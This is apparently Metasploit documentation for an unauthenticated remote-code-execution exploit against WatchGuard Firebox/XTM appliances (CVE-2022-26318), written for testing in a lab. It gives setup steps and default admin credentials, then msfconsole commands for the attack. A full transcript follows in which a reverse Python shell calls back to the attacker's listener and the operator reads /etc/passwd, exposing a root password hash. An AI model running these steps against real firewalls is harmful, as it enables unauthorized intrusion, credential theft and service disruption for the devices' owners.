## Vulnerable Application
This module exploits a buffer overflow at the administration interface (8080 or 4117) of WatchGuard Firebox and XTM appliances
which is built from a cherrypy python backend sending XML-RPC requests to a C binary called `wgagent` using pre-authentication
endpoint `/agent/login`.
This vulnerability impacts Fireware OS before 12.7.2_U2, 12.x before 12.1.3_U8, and 12.2.x through 12.5.x before 12.5.9_U2.
Successful exploitation results in remote code execution as user `nobody`.

## Installation
### Installation steps to install Watchguard Firebox virtual appliance
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download the Watchguard Firebox `12.7.2` ova instance.
* You can download it from [here](https://cdn.watchguard.com/SoftwareCenter/Files/XTM/12_7_2/FireboxV_12_7_2.ova).
* Import the ova instance in your virtualization engine.
* See instructions for VirtualBox [here](https://www.simplified.guide/virtualbox/vm-import).
* Configure the network interfaces (first interface is WAN and second interface is internal).
* You can either choose bridged or NAT depending on your preference for the test environment.
* Boot up the Firebox VM.
* You should be able to access the Watchguard Firebox either thru the console, `ssh` on port `4117`
* or via the `webui` via `https://your_firebox_wan_ip:8080`.
* The default account is `admin` and password is `readwrite`.

You are now ready to test the module.

## Verification Steps
- [x] Start `msfconsole`
- [x] `use exploit/linux/http/watchguard_firebox_unauth_rce_cve_2022_26318`
- [x] `set rhosts <ip-target>`
- [x] `set lhost <ip-attacker>`
- [x] `set target <0=Automatic>`
- [x] `exploit`

you should get a `interactive python shell` .

```shell
msf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > options

Module options (exploit/linux/http/watchguard_firebox_unauth_rce_cve_2022_26318):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
                                         using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       WatchGuard Firebox base url
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CreateSession  true             no        Create a new session for every successful login
   LHOST                           yes       The listen address (an interface may be specified)
   LPORT          4444             yes       The listen port
   SHELL          /usr/bin/python  yes       The system shell to use


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Reverse Python Interactive Shell)

View the full module info with the info, or info -d command.
```

## Options
Please set the `SHELL` option to `/usr/bin/python` becuase this is the only shell available on the appliance.

## Scenarios
###  Watchguard Firebox  Automatic - cmd/unix/reverse_python
```shell
msf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > set rhosts 192.168.201.24
rhosts => 192.168.201.24
msf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > set lhost 192.168.201.8
lhost => 192.168.201.8
msf6 exploit(linux/http/watchguard_firebox_unauth_rce_cve_2022_26318) > exploit

[*] Started reverse TCP handler on 192.168.201.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.201.24:8080 can be exploited.
[+] The target appears to be vulnerable.
[*] 192.168.201.24:8080 - Attempting to exploit...
[*] 192.168.201.24:8080 - Sending payload...
[*] Command shell session 9 opened (192.168.201.8:4444 -> 192.168.201.24:40354) at 2024-03-03 19:50:17 +0000


Shell Banner:
Python 2.7.14 (default, Oct 16 2019, 15:38:29)
[GCC 6.5.0] on linux2
-----

>>> import os
>>> import subprocess
>>> os.listdir("./")
['debug', 'platform', 'log', 'wgapi', 'hosts', 'mdev.seq', 'admd.rsync', 'portald', 'portald_data', 'eth0mac', 'rs_sn', 
'.libtdts_ctrl.lck', 'fw', 'mwan.input', 'wgmsg', 'nwd_dfltmac', 'fqdn_dns_server_list', 'lm.conf', 'sw.conf', 'wcfqdn_label',
'ifmd.cfg.lock', 'wgif_dhcp_eth0.pid', 'wgif_dhcp_eth0_uds', 'wgif_eth1.cfg.lock', 'wgif_eth1.cfg', 'rootca', 'haopevent.log',
'keeper_init_uds', 'sslvpn', 'empty', 'certs.rsync', 'certs.unpack', 'csync', 'ldapsCA', 'iked.semid', 'system_hash.txt',
'iked.params', 'iked.pid', 'cdiag', 'lockout_users.xml', 'dxcpd', 'wgredir.txt', 'dimension', 'affinityd.err', 'wgif_eth0.cfg.lock',
'wgif_eth0.cfg', 'dhcp6d.conf', '6OGD.py', 'ifmd.cfg', 'dhcpd.conf', 'dnsmasq-internal.conf', 'radvd.conf', 'yDnm.py', 'HPM4.py']
>>>
>>> os.getuid()
99
>>> os.getgid()
96
>>> print(open("/etc/passwd").read())
root:!$6$XlAENt8.$3RgXuDXBhgsf0FqJ0hrzmrh6qAhvMlCkU6Z976KIDI27gxIZOI0f27lkyJwubRxW5VaO4i9olIybS0Z2R9Ihw1:0:0:Administrator:/root:/bin/ash
bin:x:1:1:bin:/bin:
system:x:2:96:WG System daemons:/:
nobody:x:99:99:Nobody:/:
wgntp:x:98:98:OpenNTP daemon:/var/run/ntpd:
openvpn:x:97:97:OpenVPN daemon:/:
www:x:96:95:WebUI:/:
cli:x:95:95:CLI:/:
cfm:x:94:94:CFM:/var/cfm_sandbox:
agent:x:93:96:WG Agent:/:
scand:x:91:94:Scanning Daemon:/var/run/scand:
spamd:x:90:94:Spam Daemon:/var/cfm_sandbox:
sshd:x:89:89:sshd privilege separation:/var/empty:
quagga:x:88:88:Quagga Dynamic Routing:/var/run/quagga:
wgcha:x:92:96:WG Call Home Agent:/var/run/wgcha:
netdbg:x:87:87:Diagnostic Utilities:/tmp/netdbg:
cwagent:x:100:100:ConnectWise Agent:/var/empty:
dimension:x:101:101:Dimension Service:/var/run/dimension:
tss:x:102:102:trousers daemon:/:
atagent:x:103:103:Autotask Agent:/var/empty:
psad:x:104:104:PSA Daemon:/var/empty:
guac:x:105:105:Guacamole Daemons:/var/run/guac:
portald:x:106:105:Portald:/var/run/portald:
admin:x:109:109:Admin Cli Access:/etc/wg/admin-home:/usr/bin/cli
wgadmin:x:109:109:Admin Cli Access:/etc/wg/admin-home:/usr/bin/cli
dnswatchd:x:110:96:DNSWatch Service Daemon:/var/empty:
tpagent:x:111:96:Tigerpaw Agent:/var/empty:

>>> print(open("/etc/group").read())
admin:x:0:0
bin:x:1:admin,bin
nobody:x:99:
wgntp:x:98:
openvpn:x:97:
wg:x:96:
ui:x:95:
proxy:x:94:
sshd:x:89:
quagga:x:88:
netdbg:x:87:
cwagent:x:100:
dimension:x:101:
tss:x:102:
atagent:x:103:
psad:x:104:
ctlvpn:x:105:
dnswatchd:x:107:

>>> os.uname()
('Linux', 'FireboxV', '4.14.83', '#1 SMP Mon Sep 27 17:48:07 PDT 2021', 'x86_64')
>>>
```
## Limitations
There is no `shell` installed and there is only a `busybox` version available with a very limited unix command set.
The only option is to use the interactive python shell (`/usr/bin/python -i`) as payload to get access to the target.
Check out `https://docs.python.org/2.7/library/os.html` to execute commands on the target.
Another limitation is the crash of `wgagent` service that will show up in the diagnostic log and will break the user login via the `webui`.

